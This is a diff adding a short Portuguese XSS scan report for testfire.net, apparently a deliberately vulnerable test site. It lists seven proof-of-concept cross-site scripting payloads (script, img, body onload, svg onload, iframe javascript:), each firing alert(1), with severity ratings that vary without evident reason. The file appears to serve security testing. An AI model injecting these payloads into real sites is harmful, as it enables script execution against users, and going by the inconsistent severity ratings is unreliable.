@@ -1,0 +1,31 @@
+Relatório de Vulnerabilidades XSS - testfire.net
+============================================================
+
+URL: http://testfire.net
+Payload: <script>alert(1)</script>
+Gravidade: MÉDIA
+----------------------------------------
+URL: http://testfire.net
+Payload: "<script>alert(1)</script>
+Gravidade: MÉDIA
+----------------------------------------
+URL: http://testfire.net
+Payload: '<script>alert(1)</script>
+Gravidade: MÉDIA
+----------------------------------------
+URL: http://testfire.net
+Payload: <IMG SRC=javascript:alert(1)>
+Gravidade: BAIXA
+----------------------------------------
+URL: http://testfire.net
+Payload: <BODY ONLOAD=alert(1)>
+Gravidade: BAIXA
+----------------------------------------
+URL: http://testfire.net
+Payload: <svg/onload=alert(1)>
+Gravidade: ALTA
+----------------------------------------
+URL: http://testfire.net
+Payload: <iframe src="javascript:alert(1)">
+Gravidade: ALTA
+----------------------------------------
